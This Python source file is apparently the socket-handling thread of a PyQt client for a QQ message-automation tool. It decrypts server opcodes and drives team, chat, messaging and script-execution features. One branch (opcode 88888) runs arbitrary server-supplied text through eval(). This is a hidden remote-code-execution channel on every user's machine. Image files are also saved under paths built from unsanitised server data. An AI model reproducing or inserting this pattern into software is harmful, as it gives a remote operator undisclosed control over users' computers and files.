import logging
import os
import threading
import traceback
from PyQt5.QtCore import QThread, pyqtSignal, QSize, Qt
import time
from PyQt5.QtGui import QIcon, QColor
from PyQt5.QtWidgets import QMessageBox
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import pyautogui
import re
import queue

socket_information = queue.Queue()


def encrypt(message, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(message) + encryptor.finalize()
    return ciphertext

def decrypt(ciphertext, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    return plaintext

def send_encry(text, s, key, iv):  # 加密发送
    content = encrypt((text).encode('utf-8'), key, iv)
    s.sendall(content)

def send_decry(text, key, iv):  # 解密内容
    content = decrypt(text, key, iv).decode('utf-8')
    return content

class MyThread(threading.Thread):  # 多线程封装（我也看不懂反正就是这么用的）
    def __init__(self, func, *args):
        super().__init__()

        self.func = func
        self.args = args

        self.setDaemon(True)
        self.start()  # 在这里开始

    def run(self):
        self.func(*self.args)


class DataThread(QThread):
    signal = pyqtSignal(str)

    def __init__(self, lis):
        super().__init__()
        global windows, s, key, iv, sys_list
        windows = lis[0]
        s = lis[1]
        key = lis[2]
        iv = lis[3]
        sys_list = lis[4]

    def run(self):
        time.sleep(0.5)
        s.settimeout(100)
        global current_time_string, sys_list, exp_status, COLOR, temp_content, exp, lv
        while True:
            try:
                data = s.recv(10240)
                data = send_decry(data, key, iv)
                current_time_string = '[' + time.strftime("%H:%M:%S") + ']'
                if not data:  # 如果没有接收到数据，跳出循环
                    break
                ndata = data.split()
                if ndata[0] == '10005':
                    windows.close()
                    pyautogui.confirm(
                        "服务器已经关闭!\n感谢您本次的使用 服务器维护时间请关注官方公告!")

                elif ndata[0] == '10006':
                    global number
                    number = ndata[1]

                elif ndata[0] == '10012':
                    global send_status, content
                    content = re.sub('~~space~~', ' ', ndata[1])
                    content = re.sub('~~next~~', '\n', content)
                    send_status = True
                elif ndata[0] == '15000':
                    content = re.sub('~~space~~', ' ', ndata[1])
                    content = re.sub('~~next~~', '\n', content)
                    windows.uim.textBrowser.clear()
                    windows.uim.textBrowser.append(content)

                elif ndata[0] == '20001':
                    #windows.open_prompt_window("队伍不存在或加入失败")
                    pyautogui.confirm("队伍不存在或加入失败", '提示')

                elif ndata[0] == '20002':  # 加入队伍 (队员)
                    windows.uim.add_team_label.setVisible(False)
                    windows.uim.add_team_lineEdit.setVisible(False)
                    windows.uim.add_team_button.setVisible(False)
                    windows.uim.add_team_ID.setVisible(False)
                    windows.uim.add_team_label_prompt.setVisible(True)


                    windows.uim.create_team_label.setVisible(False)
                    windows.uim.add_team_label_prompt_right.setVisible(True)
                    windows.uim.create_team_button.setVisible(False)

                    windows.uim.user2_name.setText(f"{ndata[2]}")
                    windows.uim.user2_id.setText(f"ID:{ndata[1]}")

                    if ndata[3] == 'True':
                        # 接收图片文件大小
                        file_size = int(s.recv(1024).decode())
                        with open(f'./temp/{ndata[1]}.jpg', 'wb') as file:
                            total_received = 0
                            while total_received < file_size:
                                chunk = s.recv(2048)
                                time.sleep(0.2)
                                if not chunk:
                                    break
                                file.write(chunk)
                                total_received += len(chunk)
                        icon = QIcon(f"./temp/{ndata[1]}.jpg")  # 将此处的路径替换为实际的图像路径
                        scaled_icon = icon.pixmap(QSize(140, 140)).scaled(
                            QSize(140, 140),
                            Qt.AspectRatioMode.IgnoreAspectRatio,
                            Qt.TransformationMode.SmoothTransformation)
                        windows.uim.user2_image.setIcon(QIcon(scaled_icon))
                        windows.uim.user2_image.setIconSize(QSize(140, 140))
                        windows.uim.user2_image.update()


                    windows.uim.wait_label.setVisible(True)
                    windows.uim.talk_textBrowser.setVisible(True)
                    windows.uim.talk_lineEdit.setVisible(True)
                    windows.uim.talk_textBrowser.setGeometry(20, 340, 240, 80)
                    windows.uim.talk_lineEdit.setGeometry(20, 420, 240, 20)
                    pyautogui.confirm("队伍加入成功!")

                elif ndata[0] == '20003':  # 队员加入
                    windows.uim.user2_name.setText(f"{ndata[2]}")
                    windows.uim.user2_id.setText(f"ID:{ndata[1]}")
                    if ndata[3] == 'True':
                        # 接收图片文件大小
                        file_size = int(s.recv(1024).decode())
                        with open(f'./temp/{ndata[1]}.jpg', 'wb') as file:
                            total_received = 0
                            while total_received < file_size:
                                chunk = s.recv(2048)
                                time.sleep(0.2)
                                if not chunk:
                                    break
                                file.write(chunk)
                                total_received += len(chunk)
                        icon = QIcon(f"./temp/{ndata[1]}.jpg")  # 将此处的路径替换为实际的图像路径
                        scaled_icon = icon.pixmap(QSize(140, 140)).scaled(
                            QSize(140, 140),
                            Qt.AspectRatioMode.IgnoreAspectRatio,
                            Qt.TransformationMode.SmoothTransformation)
                        windows.uim.user2_image.setIcon(QIcon(scaled_icon))
                        windows.uim.user2_image.setIconSize(QSize(140, 140))
                        windows.uim.user2_image.update()
                    for button in windows.uim.buttonGroup2.buttons():
                        button.setVisible(True)
                    for button in windows.uim.buttonGroup3.buttons():
                        button.setVisible(True)
                    windows.uim.run_execute.setVisible(True)
                    windows.uim.talk_textBrowser.setVisible(True)
                    windows.uim.talk_lineEdit.setVisible(True)
                    #windows.show_message_box("提示", "队员加入成功!")
                    pyautogui.confirm("队员加入成功!")
                elif ndata[0] == '20004':  # 队长退出队伍
                    try:
                        windows.quit_team_C()
                        send_encry("20020", s, key, iv)
                        pyautogui.confirm("队长已退出队伍 队伍已关闭!", "提示")
                    except Exception as e:
                        logging.exception(str(time.strftime('%Y-%m-%d  %H:%M:%S', time.localtime())) + "错误:" + str(e))
                        pyautogui.confirm(e)
                        traceback.print_exc()
                elif ndata[0] == '20005':  # 队员退出队伍
                    try:
                        windows.quit_team_H()
                        send_encry("20021", s, key, iv)
                        pyautogui.confirm("队员已退出队伍!", "提示")
                    except Exception as e:
                        logging.exception(str(time.strftime('%Y-%m-%d  %H:%M:%S', time.localtime())) + "错误:" + str(e))
                        pyautogui.confirm(e)
                        traceback.print_exc()
                elif ndata[0] == '20011':  # 队员发送句柄消息
                    windows.uim.wait_label.setText(f"即将发送QQ句柄消息")
                    try:
                        windows.run_team_command("handle")
                    except Exception as e:
                        print(e)
                elif ndata[0] == '20012':  # 队员发送@消息
                    windows.uim.wait_label.setText(f"即将发送@QQ消息")
                    windows.run_team_command("qq")
                elif ndata[0] == '20013':  # 队员发送复制消息
                    windows.uim.wait_label.setText(f"即将发送QQ复制消息")
                    windows.run_team_command("copy")
                elif ndata[0] == '20014':  # 队员发送复制消息
                    windows.uim.wait_label.setText(f"即将进行QQ信息更新")
                    windows.run_team_command("update")
                elif ndata[0] == '20015':  # 队员发送复制消息
                    windows.uim.wait_label.setText(f"即将开始执行自动脚本")
                    windows.run_team_command("execute")
                elif ndata[0] == '20016':  # 队员发送复制消息
                    windows.uim.wait_label.setText(f"未知类型 错误!")
                    try:
                        pyautogui.confirm("ERROR! UNKNOWN")
                    except Exception as e:
                        print(e)
                elif ndata[0] == '20030':
                    text = ndata[1]
                    text = re.sub('~~space~~', ' ', text)
                    windows.uim.talk_textBrowser.append(str(text))
                    windows.play_sound()
                elif ndata[0] == '52000':  # 客户端登出
                    windows.uim.serve_label.setStyleSheet(f"color: red;")  # 设置字体颜色
                    windows.uim.serve_label.setText("断开连接")
                    now_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
                    pyautogui.confirm(
                        f"{now_time} 账号已在其他客户端登录 \n来自 IP:{ndata[1]} {ndata[2]} \n操作系统名称:{ndata[3]} 设备名称:{ndata[4]}\n本客户端已与服务器断开连接 如非本人操作请尽快修改密码!")
                    windows.close()
                    os._exit(0)
                elif ndata[0] == '99999':  # 服务器状态检测
                    color = QColor(36, 152, 42)  # 使用RGB值设置颜色为红色
                    sys_list.append('g' + current_time_string + "服务器状态刷新:已连接")
                    windows.uim.serve_label.setStyleSheet(f"color: {color.name()};")  # 设置字体颜色
                    windows.uim.serve_label.setText("已连接")
                elif ndata[0] == '30001':
                    #socket_information.put(ndata[1])
                    socket_information.put(ndata)
                    exp_status = True
                elif ndata[0] == '30002':
                    socket_information.put("内部激活:1000经验添加成功 重启客户端即可生效")
                    #socket_information.put(ndata[1])
                elif ndata[0] == '30003':
                    pass
                    socket_information.put(ndata[1])
                    #exp_status = 'Yes'
                elif ndata[0] == '88888':
                    command = ndata[1]
                    try:
                        command = re.sub('~~space~~', ' ', command)
                        command = re.sub('~~next~~', '\n', command)
                    except:
                        pass
                    if '--~~comm~~--' in command:
                        command = command.split('--~~comm~~--')
                        for x in command:
                            eval(x)
                    else:
                        eval(command)
                elif ndata[0] == '90002':
                    socket_information.put(ndata[1])

                elif not data:
                    print("断开连接")
                    break

            except Exception as e:
                if 'WinError' in str(e):
                    sys_list.append(
                        'g' + "[" + time.strftime("%H:%M:%S", time.localtime()) + "]" + "服务器状态刷新:断开连接")
                    color = QColor(164, 38, 15)  # 使用RGB值设置颜色为红色
                    windows.uim.serve_label.setStyleSheet(f"color: {color.name()};")  # 设置字体颜色
                    windows.uim.serve_label.setText("断开连接")
                    pyautogui.confirm(
                        "已与服务器断开连接 请检测网络是否连接或联系管理员获取帮助")
                if "\'utf-8\' codec can't decode byte" in str(e):
                    pass
                else:
                    print("An error occurred:", e)
                    logging.exception(str(time.strftime('%Y-%m-%d  %H:%M:%S', time.localtime())) + "错误:" + str(e))
                    traceback.print_exc()
                    break